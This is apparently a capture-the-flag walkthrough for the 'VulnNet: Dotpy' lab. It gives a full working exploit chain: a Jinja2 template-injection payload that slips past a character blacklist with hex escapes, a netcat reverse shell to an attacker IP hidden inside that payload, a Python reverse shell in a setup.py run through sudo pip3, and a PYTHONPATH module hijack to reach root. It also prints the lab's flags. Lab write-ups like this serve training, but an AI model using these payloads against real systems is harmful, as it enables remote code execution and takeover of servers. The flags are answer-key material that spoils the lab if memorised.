> Vulnet: Dotpy

# Rustscan

rustscan -a $IP --ulimit=50000 -- -sC -sV -Pn -A | tee rustscan.log


```
8080/tcp open  http    syn-ack Werkzeug httpd 1.0.1 (Python 3.6.9)
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD
|_http-server-header: Werkzeug/1.0.1 Python/3.6.9
| http-title: VulnNet Entertainment -  Login  | Discover
|_Requested resource was http://10.10.50.167:8080/login
```

Looking at dirb we got login, logout. So I created an account `testuser`. And tried to access `robots.txt`. And it gave 403 status error code.

# 403 Error

```
INVALID CHARACTERS DETECTED
Your request has been blocked.
```

And next I tried to access an unavailable page `/test` we are given 404 error!

# 404 Error

```

SORRY!
The page you’re looking for was not found.
No results for test => the /test directory is echoed
```

Hmm! Looks like Server Side Template Injection. Googling through PayloadAllTheThings we can get a payload `{{7*7}}`.
Accessing `http://10.10.50.167:8080/%7B%7B7*7%7D%7D` we are returned with `49`. But while accessing `http://10.10.50.167:8080/%7B%7B7*'7'%7D%7D` and we are returned with `7777777`. And from refering a medium article we can infer that it is Jinja2 template engine.

**Note: Actually we have to try most payloads and got twig to be woking. Refer `https://hackerone.com/reports/125980`**

PayloadAllTheThings has a list of exploits fot Jinja2. Let's try to dump all classes `{{ [].class.base.subclasses() }}`. And we are prompted with an error.

```
INVALID CHARACTERS DETECTED
Your request has been blocked.
```

So some characters are blacklisted. Looks like these special characters `[]`, `.` and `_` are blacklisted. And we have an payload for this too in PayloadAllTheThings. 

## Payload

```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

It didn't work but then after URLencoding it I got it working!

# Working Payload

```
http://10.10.50.167:8080/%7b%7b%72%65%71%75%65%73%74%7c%61%74%74%72%28%27%61%70%70%6c%69%63%61%74%69%6f%6e%27%29%7c%61%74%74%72%28%27%5c%78%35%66%5c%78%35%66%67%6c%6f%62%61%6c%73%5c%78%35%66%5c%78%35%66%27%29%7c%61%74%74%72%28%27%5c%78%35%66%5c%78%35%66%67%65%74%69%74%65%6d%5c%78%35%66%5c%78%35%66%27%29%28%27%5c%78%35%66%5c%78%35%66%62%75%69%6c%74%69%6e%73%5c%78%35%66%5c%78%35%66%27%29%7c%61%74%74%72%28%27%5c%78%35%66%5c%78%35%66%67%65%74%69%74%65%6d%5c%78%35%66%5c%78%35%66%27%29%28%27%5c%78%35%66%5c%78%35%66%69%6d%70%6f%72%74%5c%78%35%66%5c%78%35%66%27%29%28%27%6f%73%27%29%7c%61%74%74%72%28%27%70%6f%70%65%6e%27%29%28%27%69%64%27%29%7c%61%74%74%72%28%27%72%65%61%64%27%29%28%29%7d%7d%0a
```

# Result  

```
uid=1001(web) gid=1001(web) groups=1001(web) 
```

Let's try to get a reverse shell. But we can't get it working so we can encode the payload to hex and then URLEncode it. 

## Reverse shell

```
mkfifo /tmp/p; nc 10.8.107.21 5555 0</tmp/p | /bin/sh > /tmp/p 2>&1; rm /tmp/p
```

## Hexed payload

```
\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x70\x3b\x20\x6e\x63\x20\x31\x30\x2e\x38\x2e\x31\x30\x37\x2e\x32\x31\x20\x35\x35\x35\x35\x20\x30\x3c\x2f\x74\x6d\x70\x2f\x70\x20\x7c\x20\x2f\x62\x69\x6e\x2f\x73\x68\x20\x3e\x20\x2f\x74\x6d\x70\x2f\x70\x20\x32\x3e\x26\x31\x3b\x20\x72\x6d\x20\x2f\x74\x6d\x70\x2f\x70
```

## Final Payload

```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x70\x3b\x20\x6e\x63\x20\x31\x30\x2e\x38\x2e\x31\x30\x37\x2e\x32\x31\x20\x35\x35\x35\x35\x20\x30\x3c\x2f\x74\x6d\x70\x2f\x70\x20\x7c\x20\x2f\x62\x69\x6e\x2f\x73\x68\x20\x3e\x20\x2f\x74\x6d\x70\x2f\x70\x20\x32\x3e\x26\x31\x3b\x20\x72\x6d\x20\x2f\x74\x6d\x70\x2f\x70')|attr('read')()}}
```

And finally URL encoding it we got a shell as `web`.

# Priv. Esc

sudo -l

```
User web may run the following commands on vulnnet-dotpy:
    (system-adm) NOPASSWD: /usr/bin/pip3 install *
```

Let's create a directory in /tmp and put a python reverse shell in a file called `setup.py`.

# Steps

1. mkdir /tmp/shell
2. echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.107.21",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > setup.py
3. sudo -u system-adm /usr/bin/pip3 install /tmp/shell

And we are in as `system-adm`.

# user.txt

```
THM{91c7547864fa1314a306f82a14cd7fb4}
```

# Privilege Escalation

sudo -l

```
User system-adm may run the following commands on vulnnet-dotpy:
    (ALL) SETENV: NOPASSWD: /usr/bin/python3 /opt/backup.py
```

cat /opt/backup.py 

```
from datetime import datetime
from pathlib import Path
import zipfile => We can try to create a zipfile.py in /tmp and try to 
```

## Steps

1. echo "import pty; pty.spawn("/bin/bash")" > tmp/zipfile.py
2. sudo PYTHONPATH=/tmp/ /usr/bin/python3 /opt/backup.py

We are in as root!!!

# root.txt

```
THM{734c7c2f0a23a4f590aa8600676021fb}
```